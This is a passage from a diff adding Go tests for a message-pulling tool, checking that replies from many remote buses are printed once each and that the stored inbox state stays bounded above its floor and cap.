+	if in := farInbox(t, r.state); in.Floor != ovStart || len(in.Seen) != 0 {
+		t.Errorf("inbox after the first diff = %+v, want floor %d and no keys", in, ovStart)
+	}
+	r.flush = nil
+	if got := r.pull(t, v); !slices.Equal(got, []string{"a1"}) {
+		t.Errorf("pull 2 printed %q, want a1", got)
+	}
+	if len(sinces) != 2 || sinces[1] != fmt.Sprint(ovStart) {
+		t.Errorf("--since of each pull = %q, want the second at the lane start %d", sinces, ovStart)
+	}
+}
+
+// Twice an answer's worth of replies, over many far buses, leave one inbox
+// file whose keys are only those above its floor.
+func TestFarInboxStateIsBounded(t *testing.T) {
+	const repos, perRepo, pulls = 10, 20, 5
+	if repos*perRepo*pulls != 2*fleetpkg.FarMaxEvents {
+		t.Fatalf("the fixture posts %d replies, want %d", repos*perRepo*pulls, 2*fleetpkg.FarMaxEvents)
+	}
+	r := newFarRig(t)
+	for i := range repos {
+		r.far.Repo(fmt.Sprintf("r%d", i))
+	}
+	v := r.lane(t)
+	var posted []int64
+	printed := map[string]int{}
+	for n := range pulls {
+		now := r.far.Now()
+		for i := range repos {
+			for j := range perRepo {
+				ts := now - 1000 - int64(i*perRepo+j)
+				posted = append(posted, ts)
+				r.far.Append(fmt.Sprintf("r%d", i), fleettest.Reply(ts, "c1", ovHost, fmt.Sprintf("p%d-r%d-%d", n, i, j)))
+			}
+		}
+		got := r.pull(t, v)
+		if len(got) != repos*perRepo {
+			t.Errorf("pull %d printed %d replies, want %d", n, len(got), repos*perRepo)
+		}
+		for _, b := range got {
+			printed[b]++
+		}
+		in := farInbox(t, r.state)
+		above := 0
+		for _, ts := range posted {
+			if ts > in.Floor {
+				above++
+			}
+		}
+		if len(in.Seen) > above || len(in.Seen) > farSeenCap {
+			t.Errorf("pull %d: %d keys, want at most the %d replies above floor %d and the cap %d", n, len(in.Seen), above, in.Floor, farSeenCap)
+		}
+		r.far.Advance(2 * time.Minute)
+		r.clock.advance(2 * time.Minute)
+	}
+	if len(printed) != len(posted) {
+		t.Errorf("printed %d distinct replies, want %d", len(printed), len(posted))
+	}
+	for b, n := range printed {
+		if n != 1 {
+			t.Errorf("%s printed %d times, want once", b, n)
+		}
+	}
+	if got, want := tree(t, lanepkg.OverseerHostDir(r.state, "mbp")), []string{"inbox.json", "ok"}; !slices.Equal(got, want) {
+		t.Errorf("host dir holds %q, want %q", got, want)
 	}
 }
